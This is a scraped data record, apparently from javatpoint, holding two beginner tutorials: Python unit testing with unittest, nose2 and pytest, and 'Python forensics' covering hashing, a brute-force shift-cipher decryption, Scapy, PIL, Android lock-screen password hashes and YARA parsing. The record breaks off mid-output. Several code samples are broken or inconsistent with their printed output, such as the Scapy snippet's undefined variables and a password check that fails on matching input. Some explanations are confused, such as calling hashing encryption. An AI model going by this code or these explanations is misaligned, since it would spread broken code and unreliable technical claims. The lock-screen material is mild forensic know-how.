135,['Python Unit Testing'],"['In this tutorial, we will implement unit testing using the Python. Unit testing using Python is a huge topic itself, but we will cover a few essential concepts.']","['https://www.javatpoint.com/python-forensics-and-virtualization', 'https://www.javatpoint.com/python-matrix', 'https://www.javatpoint.com/https://www.javatpoint.com/unit-testing', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/manual-testing', 'https://www.javatpoint.com/https://www.javatpoint.com/integration-testing', 'https://www.javatpoint.com/https://www.javatpoint.com/python-built-in-functions', 'https://www.javatpoint.com/https://www.javatpoint.com/python-sum-function', 'https://www.javatpoint.com/python-forensics-and-virtualization', 'https://www.javatpoint.com/python-matrix', 'https://www.javatpoint.com/python-forensics-and-virtualization']",[],[],"['Testing the Code', 'Unit Tests vs. Integration Tests', 'Writing the First Test', 'Python Basic Functions and Unit Test Output', 'Advance Testing Scenario', 'Handling Expected Failures', 'Python unittest Skip Test', 'Conclusion']","['What is the Python unittest?', 'Automate vs. Manual Testing', 'Choosing a Test Runner', 'unittest', 'nose', 'pytest', 'Python Unit Test Example']",[],"['Normally, we print the value and match it with the reference output or check the output manually.', 'We will learn how to create a basic test, finds the bugs, and execute it before the code delivers to the users.', 'We can test our code using many ways. In this section, we will learn the basic steps towards advanced methods.', 'Every time we give the inputs or change the code, we need to go through every single feature of the list and check it.', 'It is the most common way of testing and it is also time-consuming process.', 'Python offers a set of tools and libraries which help us to create automated tests for the application.', 'These components can be anything in our code, such as functions, classes and module that we have written.', ""That's why we consider unit testing to get to know the exact problem in the tested code."", ""Let's understand the following example."", 'We apply the unit testing Python built-in function sum() against the known output. We check that the sum() of the number (2, 3, 5) equals 10.', 'Above line will return the right result because values are correct. If we pass the wrong arguments it will return the Assertion error. For example -', 'We can put the above code into the file and execute it again at the command line.', 'In the following example, we will pass the tuple for testing purpose. Create a new file named test_sum2.py. ', 'Example - 2:', 'Explanation -', 'In the above code, we have passed the wrong input to the test_sum_tuple(). The output is dissimilar to the predicted result.', ""We can choose any of them according to our requirements. Let's have a brief introduction."", ""Let's implement the above example using the unittest case."", 'As we can see in the output, it shows the dot(.) for the successful execution and F for the one failure.', 'Sometimes, we need to write hundreds or thousands of test lines for application; it becomes so difficult to understand.', 'Working with the nose2, we need to install it using the following command.', 'Run the following command in the terminal to test the code using nose2.', 'The output is as follows.', 'The nose2 provides many command line flags for filtering the test. You can learn more from its official documentation.', 'The pytest provides the following benefits -', ""Let's understand the following example."", 'First, we create the file my_sum file and write code in it.', 'We initialized the total variable which iterates over all the values in arg.', 'Now, we create a file name test.py with the following code.', 'Explanation:', 'After running the code, it returns dot(.) which means there is no error in the code.', ""Let's understand another example."", 'Example - 2', 'The unittest module produces three possible outcomes. Below are the potential outcomes.', ""Let's see the following basic functions."", 'We must follow the given step while creating test for the application.', 'The input data that we create is known as a fixture. We can reuse fixtures in our application.', 'When we run the code repeatedly and pass the different values each time and expecting the same result, this process is known as parameterization.', 'In the earlier example, we pass the integer number to test sum(); what happens if we pass the bad value, such as a single integer or a string?', 'The sum() will throw an error as expected. It would happen due to failed test.', ""We can use the .assertRaises() to handle the expected errors. It is used inside with statement. Let's understand the following example."", 'We can skip an individual test method or TestCase using the skip test technique. The fail will not count as a failure in TestResult.', 'Consider the following example to skip the method unconditionally.', 'Explanation:', 'We can skip a particular method or block based on the specific condition.', 'Example - 2:', 'Explanation:']","['Unit testing is a technique in which particular module is tested to check by developer himself whether there are any errors. The primary focus of unit testing is test an individual unit of system to analyze, detect, and fix the errors.', 'Python provides the unittest module to test the unit of source code. The unittest plays an essential role when we are writing the huge code, and it provides the facility to check whether the output is correct or not.', ""This process takes lots of time. To overcome this problem, Python introduces the unittest module. We can also check the application's performance by using it."", 'On the other hand, the automated testing executes the code according to our code plan which means it runs a part of the code that we want to test, the order in which we want to test them by a script instead of a human.', 'Unit testing is a smaller test, it checks a single component that it is working in right way or not. Using the unit test, we can separate what necessities to be fixed in our system.', 'We have seen the two types of testing so far; an integration test checks the multiple components; where unit test checks small component in or application.', 'The above method is good but what if there are multiple errors. Python interpreter would give an error immediately if the first error is encountered. To remove this problem, we use the test runners.', 'Python contains many test runners. The most popular build-in Python library is called unittest. The unittest is portable to the other frameworks. Consider the following three top most test runners.', 'The unittest is built into the Python standard library since 2.1. The best thing about the unittest, it comes with both a test framework and a test runner. There are few requirements of the unittest to write and execute the code.', 'The pytest test runner supports the execution of unittest test cases. The actual benefit of the pytest is to writing pytest test cases. The pytest test cases are generally sequence of methods in the Python file starting.', 'In the above code, we imported sum() from the my_sum package that we created. We have defined the Checkclass, which inherits from unittest.TestCase. There is a test methods - .test_list_int(), to test the integer.', 'Creating inputs such as static value for the input like a string or numbers is a slightly complex task. Sometimes, we need to create an instance of a class or a context.', 'In the above example, the skip() method prefixed by the @token. It takes the one argument a log message where we can describe the reason for skip. The s character denotes that a test has been successfully skipped.', 'As we can see in the output, the conditions b == 0 and a>b is true so the test_mul() method has skipped. On the other hand, test_mul has been marked as an expected failure.']","['Manual testing has another form, which is known as exploratory testing. It is a testing which is done without any plan. To do the manual testing, we need to prepare a list of the application; we enter the different inputs and wait for the expected output.', 'Suppose we want to check the lights of the car and how we might test them. We would turn on the light and go outside the car or ask the friend that lights are on or not. The turning on the light will consider as the test step, and go outside or ask to the friend will know as the test assertion. In the integration testing, we can test multiple components at once.', ""But there is a limitation of the integration testing; what if an integration test doesn't give the expected result. In this situation, it will be very hard to recognize which part of the system is falling. Let's take the previous example; if the light didn't turn on, the battery might be dead, blub is broken, car's computer have failed."", 'The nose test runner can be a suitable replacement of the unittest test runners because it is compatible with any tests writing using the unittest framework. There are two types of nose - nose and nose2. We recommend using nose2 because it is a latest version.', 'Here we will apply all the concepts that we have learned in earlier section. First, we need to create a file name test.py or anything. Then make inputs and execute the code being tested, capturing the output. After successfully run the code, match the output with an expected result.', 'We have discussed the all-important concept related to Python unit testing. As a beginner, we need to write the smart, maintainable methods to validate our code. Once we get a decent command over the Python unit test, we can switch to other frameworks such as the pytest and leverage more advanced features.']","['assert sum([ 2, 3, 5]) == 10, ""Should be 10""', 'assert sum([1, 3, 5]) == 10, ""Should be 10""', 'Traceback (most recent call last):', 'File ""<stdin>"", line 1, in <module>', 'AssertionError: Should be 10', 'def test_sum():', 'assert sum([2, 3, 5]) == 10, ""It should be 10""', 'if __name__ == ""__main__"":', 'test_sum()', 'print(""Everything passed"")', 'def test_sum2():', 'assert sum([2, 3, 5]) == 10, ""It should be 10""', 'def test_sum_tuple():', 'assert sum((1, 3, 5)) == 10, ""It should be 10""', 'if __name__ == ""__main__"":', 'test_sum2()', 'test_sum_tuple()', 'print(""Everything is correct"")', 'import unittest', 'class TestingSum(unittest.TestCase):', 'def test_sum(self):', 'self.assertEqual(sum([2, 3, 5]), 10, ""It should be 10"")', 'def test_sum_tuple(self):', 'self.assertEqual(sum((1, 3, 5)), 10, ""It should be 10"")', ""if __name__ == '__main__':"", 'unittest.main()', 'pip install nose2', 'python -m nose2', 'def test_sum():', 'assert sum([2, 3, 5]) == 10, ""It should be 10""', 'def test_sum_tuple():', 'assert sum((1, 2, 5)) == 10, ""It should be 10""', 'def sum(arg):', 'total = 0', 'for val in arg:', 'total += val', 'return total', 'import unittest', 'from my_sum import sum', 'class CheckSum(unittest.TestCase):', 'def test_list_int(self):', 'data = [1, 2, 3]', 'result = sum(data)', 'self.assertEqual(result, 6)', ""if __name__ == '__main__':"", 'unittest.main()', 'class Person:', 'name1 = []', 'def set_name(self, user_name):', 'self.name1.append(user_name)', 'return len(self.name1) - 1', 'def get_name(self, user_id):', 'if user_id >= len(self.name1):', ""return ' No such user Find'"", 'else:', 'return self.name1[user_id]', ""if __name__ == '__main__':"", 'person = Person()', ""print('Peter Decosta has been added with id ', person.set_name('Peter'))"", ""print('The user associated with id 0 is ', person.get_name(0))"", 'import unittest', '# First we import the class which we want to test.', 'import Person1 as PerClass', 'class Test(unittest.TestCase):', '""""""', 'The basic class that inherits unittest.TestCase', '""""""', 'person = PerClass.Person()  # instantiate the Person Class', 'user_id = []  # This variable stores the obtained user_id', 'user_name = []  # This variable stores the person name', '# It is a test case function to check the Person.set_name function', 'def test_0_set_name(self):', 'print(""Start set_name test\\n"")', 'for i in range(4):', '# initialize a name', ""name = 'name' + str(i)"", '# put the name into the list variable', 'self.user_name.append(name)', '# extraxt the user id obtained from the function', 'user_id = self.person.set_name(name)', '# check if the obtained user id is null or not', 'self.assertIsNotNone(user_id)', '# store the user id to the list', 'self.user_id.append(user_id)', 'print(""The length of user_id is = "", len(self.user_id))', 'print(self.user_id)', 'print(""The length of user_name is = "", len(self.user_name))', 'print(self.user_name)', 'print(""\\nFinish set_name test\\n"")', '# Second test case function to check the Person.get_name function', 'def test_1_get_name(self):', 'print(""\\nStart get_name test\\n"")', '# total number of stored user information', 'length = len(self.user_id)', 'print(""The length of user_id is = "", length)', 'print(""The lenght of user_name is = "", len(self.user_name))', 'for i in range(6):', '# if i not exceed total length then verify the returned name', 'if i < length:', '# if the two name not matches it will fail the test case', 'self.assertEqual(self.user_name[i], self.person.get_name(self.user_id[i]))', 'else:', 'print(""Testing for get_name no user test"")', ""# if length exceeds then check the 'no such user' type message"", ""self.assertEqual('There is no such user', self.person.get_name(i))"", 'print(""\\nFinish get_name test\\n"")', ""if __name__ == '__main__':"", '# begin the unittest.main()', 'unittest.main()', 'import unittest', 'from my_sum import sum', 'class CheckSum(unittest.TestCase):', 'def test_list_int(self):', '#  Test that it can sum a list of integers', '', 'data = [1, 2, 3]', 'res = sum(data)', 'self.assertEqual(res, 6)', 'def test_bad_type(self):', 'data = ""Apple""', 'with self.assertRaises(TypeError):', 'res = sum(data)', ""if __name__ == '__main__':"", 'unittest.main()', 'import unittest', 'def add(x,y):', 'c = x + y', 'return c', 'class SimpleTest(unittest.TestCase):', '@unittest.skip(""The example skipping method"")', 'def testadd1(self):', 'self.assertEquals(add(10,5),7)', ""if __name__ == '__main__':"", 'unittest.main()', 'import unittest', 'class suiteTest(unittest.TestCase):', 'a = 100', 'b = 40', 'def test_add(self):', 'res = self.a + self.b', 'self.assertEqual(res, 100)', '@unittest.skipIf(a > b, ""Skip because a is greater than b"")', 'def test_sub(self):', 'res = self.a - self.b', 'self.assertTrue(res == -10)', '@unittest.skipUnless(b == 0, ""Skip because b is eqaul to zero"")', 'def test_div(self):', '', 'res = self.a / self.b', 'self.assertTrue(res == 1)', '@unittest.expectedFailure', 'def test_mul(self):', '', 'res = self.a * self.b', 'self.assertEqual(res == 0)', ""if __name__ == '__main__':"", 'unittest.main()']","['$ python sum.py', 'Everything is correct', 'Everything is correct', 'Traceback (most recent call last):', 'File ""<string>"", line 13, in <module>', 'File ""<string>"", line 9, in test_sum_tuple', 'AssertionError: It should be 10', '.F', '-', 'FAIL: test_sum_tuple (__main__.TestingSum)', '--', 'Traceback (most recent call last):', 'File ""<string>"", line 11, in test_sum_tuple', 'AssertionError: 9 != 10 : It should be 10', '----------------------------------------------------------------------', 'Ran 2 tests in 0.001s', 'FAILED (failures=1)', 'Traceback (most recent call last):', 'File ""<string>"", line 14, in <module>', 'File ""/usr/lib/python3.8/unittest/main.py"", line 101, in __init__', 'self.runTests()', 'File ""/usr/lib/python3.8/unittest/main.py"", line 273, in runTests', 'sys.exit(not self.result.wasSuccessful())', 'SystemExit: True', 'FAIL: test_sum_tuple (__main__.TestSum)', '--', 'Traceback (most recent call last):', 'File ""test_sum_unittest.py"", line 10, in test_sum_tuple', 'self.assertEqual(sum((2, 3, 5)), 10, ""It should be 10"")', 'AssertionError: It should be 10', '--', 'Ran 2 tests in 0.001s', 'FAILED (failures=1)', '.', '----------------------------------------------------------------------', 'Ran 1 test in 0.000s', 'OK', 'Peter Decosta has been added with id 0', 'The user associated with id 0 is Peter', 'Start set_name test', 'The length of user_id is =  4', '[0, 1, 2, 3]', 'The length of user_name is =  4', ""['name0', 'name1', 'name2', 'name3']"", 'Finish set_name test', 'Start get_name test', 'The length of user_id is =  4', 'The lenght of user_name is =  4', 'Testing for get_name no user test', '.F', '======================================================================', 'FAIL: test_1_get_name (__main__.Test)', '----------------------------------------------------------------------', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/multiprocessing.py"", line 502, in test_1_get_name', ""self.assertEqual('There is no such user', self.person.get_name(i))"", ""AssertionError: 'There is no such user' != ' No such user Find'"", '- There is no such user', '+  No such user Find', '----------------------------------------------------------------------', 'Ran 2 tests in 0.002s', 'FAILED (failures=1)', '..', '----------------------------------------------------------------------', 'Ran 2 tests in 0.006s', 'OK', 's', '----------------------------------------------------------------------', 'Ran 1 test in 0.000s', 'OK (skipped=1)', 'Fsx.', '======================================================================', 'FAIL: test_add (__main__.suiteTest)', '----------------------------------------------------------------------', 'Traceback (most recent call last):', 'File ""C:/Users/DEVANSH SHARMA/PycharmProjects/Hello/multiprocessing.py"", line 539, in test_add', 'self.assertEqual(res, 100)', 'AssertionError: 50 != 100', '----------------------------------------------------------------------', 'Ran 4 tests in 0.001s', 'FAILED (failures=1, skipped=1, expected failures=1)']","['Method|||Description&&&.assertEqual(a, b)|||a == b&&&.assertTrue(x)|||bool(x) is True&&&.assertFalse(x)|||bool(x) is False&&&.assertIs(a, b)|||a is b&&&.assertIsNone(x)|||x is None&&&.assertIn(a, b)|||a in b&&&.assertIsInstance(a, b)|||isinstance(a, b)&&&.assertNotIn(a, b)|||a not in b&&&.assertNotIsInstance(a,b)|||not isinstance(a, b)&&&.assertIsNot(a, b)|||a is not b']","['|||unittest|||nose Or nose2|||pytest||||||The code must be written using the classes and functions.|||The sequence of distinct assertion methods in the TestCase class apart from the built-in asserts statements.||||||It supports the built-in assert statement instead of using a special assert*() methods.|||It also provides support for cleaning for test cases.|||It can rerun from the last cases.|||It has an ecosystem of hundreds of plugin to extend the functionality.||||||Generate necessary input|||Execute the code, taking the output.|||Match the output with an expected result.|||&&&|||OK - If all tests are passed, it will return OK.|||Failure - It will raise an AssertionError exception, if any of tests is failed.|||Error - If any errors occur instead of Assertion error.|||']"
136,['Python Forensics and Virtualization | Hash Functions'],"['In this tutorial, we will learn the Forensics science using Python, basic Python forensics applications, Hash functions, Cracking an Encryption, Visualization, Naming Conventions, Dshell and Scapy, Network Forensics with its detailed explanation.']","['https://www.javatpoint.com/best-books-to-learn-python', 'https://www.javatpoint.com/python-unit-testing', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/dna-full-form', 'https://www.javatpoint.com/https://www.javatpoint.com/data-mining', 'https://www.javatpoint.com/https://www.javatpoint.com/computer-graphics-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/python-multiprocessing', 'https://www.javatpoint.com/https://www.javatpoint.com/ram-full-form', 'https://www.javatpoint.com/https://www.javatpoint.com/ram', 'https://www.javatpoint.com/best-books-to-learn-python', 'https://www.javatpoint.com/python-unit-testing', 'https://www.javatpoint.com/best-books-to-learn-python']","['https://static.javatpoint.com/python/images/python-forensics-and-virtualization.png', 'https://static.javatpoint.com/python/images/python-forensics-and-virtualization2.png', 'https://static.javatpoint.com/python/images/python-forensics-and-virtualization3.png', 'https://static.javatpoint.com/python/images/python-forensics-and-virtualization4.png']",[],"['Introduction', 'Introduction to Computational Forensics', 'Naming Conventions for Python Forensics Application', 'Python Hash Function', 'Cracking an Encryption in Python', 'Virtualization', 'Network Forensics in Python', 'Python Scapy and Dshell', 'Python Searching', 'Python Indexing', 'Python Image Library', 'Python Multiprocessing Support', 'Mobile Forensics in Python', 'Rooted Smartphones', 'JTAG Adapter', 'Memory and Forensics']","['Example', 'Python Scapy', 'Python Dshell', 'Multiprocessing', 'Volatile Memory', 'YARA Rules']",[],"['Before go further, you must familiar with the Python and its advance concepts.', 'In a few words, the computation forensics is used to study the digital evidence, computational forensics deals with the various types of evidence.', 'We must familiar with the naming convention and patterns to follow the Python Forensics guidelines. Consider the following table.', ""Let's understand the following example -"", 'Now, we will re-enter the password.', 'The hash function has the following properties.', 'We must know how to encrypt the text data that we fetch during analysis and evidence. First, understand the basic cryptographic.', ""Let's understand the following example to crack the vector data."", 'The virtualization of hardware plays very important role in the computer forensics. By using the virtualization, we can get following advantages.', 'We define the following steps to create virtual machine using Python', 'Step - 1: Suppose we consider our local machine as ""dummy"". Each Virtual Machine will have at least 512 MB of memory.', 'Step - 2: Now, we attach this virtual machine to the default cluster.', 'Step - 3: Next, boot the virtual machine from the virtual HDD.', ""Now, we will combine the above steps into a virtual machine parameter object. Let's understand the following example."", 'Client - The client runs personal computer and workstation.', ""Server - The server executes the client's request."", 'Protocols - Protocols are the set of rule that must be followed while data transfer.', ""Let's understand the following example of network"", ""Let's understand the brief introduction Python Scapy and Dshell."", 'The experience and knowledge both are required to get the information from the deleted messages.', 'Resource data can be either simple data structure such as databases or complex data structures such as JPEG image.', 'We define the programming example to explain how it actually works.', 'Step - 1: Suppose we have a following image where we need to extract the details.', 'The output is returned in the form of a list. It is a pixel value of the RGB combination that gives a better picture of what data is needed.', ""Let's understand the following example of multiprocessing."", 'The android smartphones uses the PIN, or alphanumeric password. The password can be between 4 and 16 digits/characters.', ""Android stores a salted SHA1-hashsum and MD5-hashsum of this password. Let's see the following example."", ""The file's dump /data/system/password.key is stored in SQLite database under the lock screen.password_salt. The Password is stored under settings.db."", 'Python forensics primarily focuses on the volatile memory with the help of Volatility which is a Python based framework.', 'The volatile memory follows the same pattern as the other forensics investigations.', 'The RAM dump is tool which used to analysis the gathered data from the RAM.']","['With its wide applications, Python also provides the facility to work with the digital forensics. By using it, we can gather data, extract evidence, and also encrypt password. It will support us to reinstate the reliability of evidence.', 'Suppose a general commander sends a message to senior to save the text from their enemies. Here, we take shift the plain text letter four place in the alphabet. Now, the A will be E, each B is F and so no.', 'A virtualization is an act of emulate IT system such as workstations, networks and storage. We make the virtual instance of such a resource. It can be done with the help of hypervisor.', 'Websockets - A websockets are protocol that provides the full-duplex communication and runs over the TCP connection. We can send the bi-direction messages using the websockets.', 'With the help of those protocols, we can authenticate the information and sent or received by the third party users. But, encryption is necessary to secure channels.', 'The Dshell is a Python-based network forensics analysis toolkit. It was developed by the US army research laboratory and released it open-source in 2014. It makes the forensics investigation very easy. Dshell provides the following decoders.', 'Python provides the various built-in modules to support search operation. The investigator can find the result using the keywords such as ""who"", ""what"", ""where"", ""when"", ""which"", etc. Let\'s understand the following example.', 'The real meaning of forensics investigation is to extract the valuable information from the available resources. Getting all the relevant information from the resource is essential for the report. It helps us to derive appropriate result.', 'Investigator can easily access the information from the simple data structure but extracting information from the complex data structure is tedious task.', ""Step - 2: An image consists of various pixel values. The PIL library uses to extract the image details for gather evidence. Let's understand the following example."", 'Multiprocessing is an ability of the system that support more than one process. It enables the several programs to run concurrently. There are two types of the multiprocessing - symmetric and asymmetric processing.', 'Forensics investing is not only limited to the standard computer hardware such as hard disk, CPUs, etc. Hardware is followed with the help of techniques to analyze non-standard hardware or transient evidence.', 'Nowadays, smartphones are widely used in digital investigation, but they still meant as non-standard. With the proper research of smartphones, we can extract photos, smartphones, and messages.', 'In the following example, we will get through a lock screen to extract data. The smartphone password generally stores inside a file password.key in /data/system.', 'YARA is a tool which used to examine the suspected files/ directories and match strings. It is based on the pattern matching implementation. It plays an important role in forensics analysis.']","['Collecting and preserving evidence is most essential for cyber forensic investigation and analysis at the computer devices. It plays important role in a court room to be used against the criminal. Nowadays, technology facilitates us to get the information by just typing the query on the browser. But it also invites the cyber crooks. Cyber crooks are those who perform the malicious activity by using their system and internet. They can get your all information from sitting somewhere else.', 'Computational Forensics is a part of study which used to solve problems in various forensics disciplines. It uses computer-based modeling, analysis, computer simulation and recognition. Python Forensics was invented by the Chet Homster. There are also pattern evidence, such as fingerprints, shoeprints, toolmarks and any documents. It makes use of procedures, scope of objects, and substances. There are also physiological and behavioral patterns such as digital evidence, DNA, and crime scenes.', 'We can also use the various algorithms to deal with the signal and image processing. By using algorithms, we can also handle the, data mining, computer graphics, machine learning, computer vision data visualization, and statistical pattern recognition.', ""The hashing algorithm is one of the best ways of take as an input a stream of binary data. In the real life scenario, we can encrypt our password, file, or even any kinds of digital file or data. The algorithm takes an input and generates the encrypted message. Let's see the given example."", ""Python hash function is used to map a vast amount of data to a fixed value. An input returns the same output. It is a hash sum and stores features with precise information. Once we map the data to a fixed value, that cannot be revert. That's why we also refer it as one-way cryptographic algorithm."", 'Generally, secret messages are sent by the army person to convey their plans without get read by their enemies. These messages are not in the human-readable format. The plain texts are encrypted by using the encryption algorithm and these texts are called cipher text.', ""Python also provide the facility to work with the network forensics. In the modern days, Python network forensics environment investing can come across many difficulties. These problems can be responding to a breach report, executing assessments pertaining to susceptibility, or validating regularity compliances. Let's understand the basic terminology of network forensics."", ""A scapy is Python-based tool which analyze and manipulate network traffic. With the help of scapy, we can analyze packet manipulation. We can also capture and decode the packets of a wide number of protocols. The benefit of using scapy is to get the detailed report about network traffic to the investigator. The third-party tools such as OS fingerprint app can be also used in Scapy. Let's understand the following example."", 'Searching is the most important part of the forensics investigation. Nowadays, the good search is upon the investigator who is running the evidence. Keyword searching from the message is a pillar of the investigation. We can find the strong evidence with the help of a keyword.', 'Indexing is feature that the investigator can use to gather potential evidence from the files. The evidence can be restricted within the memory snapshot, a disk image, a file, or a network trace. It is very helpful to reduce time for time-consuming tasks like keyword searching. The indexing also used to locate the keywords in interactive searching phase. In the following example, we have explained indexing in Python.', ""Python provides the Image library which is known as PIL. It is used to add image processing capabilities to out Python interpreter. It also support the file formats, graphics capabilities and also provides powerful image processing. Let's understand the following image to extracting data from images."", ""Forensics experts find difficulties to apply digital solutions to large digital evidence on the common crime. Most of the digital evidences are the single threaded that mean we can execute only one command at time. Let's see the brief introduction of multiprocessing."", ""The above code is a sample code of crack smartphone password. The dictionary attack won't be affected to crack the password since hashed password is stored in a salt file. The salt file is a string of hexadecimal representation of a random integer of 64 bit. The Rooted smartphones or JTAG Adapter can access the salt file."", 'The JTAG stands for Joint Test Action Group which can be used to access the salt. Similarly, a Riff-Box or a JIG-Adapter can be used to access the sale files. We can find the position of the encrypted data using the obtained information from Riff-box. The rules are given below.', ""Volatile memory is a type of memory that erased when the system's power is turned off or interrupted. In the simple words, if we are working on a document that has not been saved to the hard disk and suddenly the power goes off, we will lose our data.""]","['import sys,string,md5', 'print(""Enter the name"")', 'line=sys.stdin.readline()', 'line=line.rstrip()', 'md5_object=md5.new()', 'md5_object.update(line)', 'print(md5_object.hexdigest())', 'import hashlib', 'import uuid', 'def hash_pass(password):', 's = uuid.uuid4().hex', ""return hashlib.sha256(s.encode() + password.encode()).hexdigest() + ':' + s"", 'def verify_password(hashed_password, user_password):', ""password, s = hashed_password.split(':')"", 'return password == hashlib.sha256(s.encode() + user_password.encode()).hexdigest()', ""new_password = input('Enter your password :')"", 'hashed_password = hash_pass(new_password)', ""print('The hash string to store in the db is: ' + hashed_password)"", ""old_password = input('Enter new password ')"", 'if verify_password(hashed_password, old_password):', ""print(' Entered password is correct')"", ""print('Passwords do not match')"", 'import sys', 'def decryption(text,cipher):', ""simple_text=''"", 'for each in cipher:', 'x = (ord(each)-text) % 126', 'if x < 32:', 'x+=95', 'simple_text += chr(x)', 'print(simple_text)', ""cipher_text = input('Enter the message: ')"", 'for i in range(1,95,1):', 'decryption(i,cipher_text)', 'virmach_memory = 512 * 1024 * 1024', 'virmach_cluster = api.clusters.get(name = ""Default"")', 'vm_os = params.OperatingSystem(boot = [params.Boot(dev = ""hd"")])', 'from ovirtsdk.xml import params', 'from ovirtsdk.api import API', '# We need to provide Api credentials for virtual machine', 'api = API(url=""https://HOST"",', 'username=""Example"",', 'password=""example123"",', 'ca_file=""ca.crt"")', 'virmach_name = ""dummy""', 'virmach_memory = 512 * 1024 * 1024  # calculating the memory in bytes', 'virmach_cluster = api.clusters.get(name=""Default"")', 'virmach_template = api.templates.get(name=""Blank"")', '# here we are assigning the parameters to operating system', 'virmach_os = params.OperatingSystem(boot=[params.Boot(dev=""hd"")])', 'virmach_params = params.VM(name=virmach_name,', 'memory=virmach_memory,', 'cluster=virmach_cluster,', 'template=virmach_template,', 'os = virmach_os)', 'try:', 'api.vms.add(vm=virmach_params)', 'print(""Virtual machine \'%s\' added successfully."" % virmach_name)', 'except Exception as ex:', 'print(""Adding virtual machine \'%s\' failed: %s"" % (virmach_name, ex))', 'api.disconnect()', 'except Exception as ex:', 'import socket', '# creating a socket object', 'sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)', '# getting local machine name', 'host = socket.gethostname()', 'port = 8080', '# connection to hostname on the port.', 'sock.connect((host, port))', '# Receive no more than 1024 bytes', 'temp = sock.recv(1024)', 'print(""The client waits for connection"")', 'sock.close()', '#Imports scapy and GeoIP toolkit', 'import scapy, GeoIP', 'from scapy import *', 'geoIp = GeoIP.new(GeoIP.GEOIP_MEMORY_CACHE)', 'def locatePackage(pkg):', '# extracts the source IP address', 'source = pkg.getlayer(IP).src', '# extracts the destination IP address', 'destination = pkg.getlayer(IP).dst', '# gets Country details of source', 'srcCountry = geoIp.country_code_by_addr(source)', 'dstCountry = geoIp.country_code_by_addr(destination)', '# gets country details of destination', 'print src+""(""+sourceCountry+"") >> ""+destination+""(""+destinationcountry+"")\\n""', '# Searching a particular word from a message', 'str1 = ""This is an example for Computational forensics of gathering evidence!""', 'str2 = ""string""', 'print(str1.find(str2))', 'print(str1.find(str2, 10))', 'print(str1.find(str2, 40))', ""list1 = [123, 'example', 'creative', 'indexing']"", 'print(""Index example : "", list1.index(\'example\'))', 'print(""Index for indexing : "", list1.index(\'indexing\'))', 'str1 = ""This is a message for forensic investigation indexing""', 'str2 = ""message""', 'print(""Index of the character keyword found is "")', 'print(str1.index(str2))', 'from PIL import Image', ""im = Image.open('penguin.jpeg', 'r')"", 'pix_val = list(im.getdata())', 'pix_val_flat = [x for sets in pix_val for x in sets]', 'print(pix_val_flat)', 'import random', 'import multiprocessing', 'def list_append(count, id, out_list):', '# count number of process at a time', 'for i in range(count):', 'out_list.append(random.random())', 'if __name__ == ""__main__"":', 'size = 810', 'procs = 2', 'jobs = []', 'for i in range(0, procs):', 'out_list = list()  # list of processes', 'process1 = multiprocessing.Process(', 'target=list_append, args=(size, i, out_list))', '# appends the list of processes', 'jobs.append(process1)', '# Calculate the random number of processes', 'for j in jobs:', 'j.start()  # initiate the process', '# After the processes have finished execution', 'for j in jobs:', 'j.join()', 'print(""List processing complete."")', 'public byte[] passwordToHash(String password) {', 'if (password == null) {', 'return null;', 'String algo = null;', 'byte[] hashed = null;', 'try {', 'byte[] saltedPassword = (password + getSalt()).getBytes();', 'byte[] sha1 = MessageDigest.getInstance(algo = ""SHA-1"").digest(saltedPassword);', 'byte[] md5 = MessageDigest.getInstance(algo = ""MD5"").digest(saltedPassword);', 'hashed = (toHex(sha1) + toHex(md5)).getBytes();', '} catch (NoSuchAlgorithmException e) {', 'Log.w(TAG, ""Failed to encode string because of missing algorithm: "" + algo);', 'return hashed;', 'import operator', 'import os', 'import sys', 'sys.path.insert(0, os.getcwd())', 'import plyara.interp as interp', '# Plyara is a script that lexes and parses a file consisting of one more Yara', ""if __name__ == '__main__':"", 'file_to_analyze = sys.argv[1]', 'Dictrules = interp.parseString(open(file_to_analyze).read())', 'authors = {}', 'imps = {}', 'meta_keys = {}', 'max_strings = []', 'max_string_len = 0', 'tags = {}', 'rule_count = 0', 'for rule in Dictrules:', 'rule_count += 1', '# Imports', ""if 'imports' in rule:"", ""for imp in rule['imports']:"", 'imp = imp.replace(\'""\', \'\')', 'if imp in imps:', 'imps[imp] += 1', 'imps[imp] = 1', '# Tags', ""if 'tags' in rule:"", ""for tag in rule['tags']:"", 'if tag in tags:', 'tags[tag] += 1', 'else:', 'tags[tag] = 1', '# Metadata', ""if 'metadata' in rule:"", ""for key in rule['metadata']:"", 'if key in meta_keys:', 'meta_keys[key] += 1', 'else:', 'meta_keys[key] = 1', ""if key in ['Author', 'author']:"", ""if rule['metadata'][key] in authors:"", ""authors[rule['metadata'][key]] += 1"", ""authors[rule['metadata'][key]] = 1"", '# Strings', ""if 'strings' in rule:"", ""for strr in rule['strings']:"", ""if len(strr['value']) > max_string_len:"", ""max_string_len = len(strr['value'])"", ""max_strings = [(rule['rule_name'], strr['name'], strr['value'])]"", ""elif len(strr['value']) == max_string_len:"", ""max_strings.append((rule['rule_name'], strr['key'], strr['value']))"", 'print(""\\nThe number of rules implemented"" + str(rule_count))', 'ordered_meta_keys = sorted(meta_keys.items(), key=operator.itemgetter(1),', 'reverse = True)', 'ordered_authors = sorted(authors.items(), key=operator.itemgetter(1),', 'reverse = True)', 'ordered_imps = sorted(imps.items(), key=operator.itemgetter(1), reverse=True)', 'ordered_tags = sorted(tags.items(), key=operator.itemgetter(1), reverse=True)']","['Enter your password: sharma', 'The hash string to store in the db is: 947782bdb0c7a5ad642f1f26179b6aef2d9857427b45a09af4fce3b8f1346e91:8a8371941513482487e5ab8af2ae6466', 'Enter your password devansh', 'The hash string to store in the db is: 4762866edd3b49c7736163ef3d981e42629a09a9ca7e081f56d116e137d77b9c:ebbf5b16bd9f4b989505a495bf7ae9b9', 'Enter new password sharma', 'Passwords do not match', 'Enter message: Yes', '~', '}', '|', '{', 'z', 'y', 'x', 'w', 'v', 'u', 't', 's', 'r', 'r~', 'q', 'q}', 'p', 'p|', 'o', 'o{', 'n', 'nz', 'm', 'my', 'l', 'lx', 'k', 'kw', 'j', 'jv', 'i', 'iu', 'h', 'ht', 'g', 'gs', 'f', 'fr', 'e', 'eq', 'd', 'dp', 'dp~', 'c', 'co', 'co}', 'b', 'bn', 'bn|', 'a', 'am', 'am{', '`', 